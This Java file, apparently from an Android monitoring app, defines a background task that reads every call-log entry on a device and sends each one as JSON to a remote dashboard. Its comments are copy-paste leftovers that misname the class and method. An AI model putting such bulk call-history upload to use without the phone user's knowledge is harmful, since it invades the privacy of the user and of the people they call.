package the5concurrentnodes.mmaData.call;


import android.content.Context;
import android.os.AsyncTask;

import the5concurrentnodes.mmaData.sms.Sms;
import the5concurrentnodes.mmaData.sms.SmsHandler;

public class CallsInitPush extends AsyncTask<Void, Void, Void> {

    private Context context;

    /**
     * Constructor for PushAppsInfo.
     * @param context is androids Context instance.
     */
    public CallsInitPush(Context context) {
        this.context = context;
    }

    /**
     * submitLog overrides the submitLog function of class LogHandler so that it will submit Calls
     * JSON object to a specified url and function on the dashboard.
     * @param params is the JSON object of an app object.
     */
    @Override
    protected Void doInBackground(Void... params) {

        CallHandler handler = new CallHandler();

        for(Call call : handler.getAllCalls(context)) {
            handler.submitLog(context, call.toJSONObject());
            if(isCancelled()) break;
        }
        return null;
    }
}
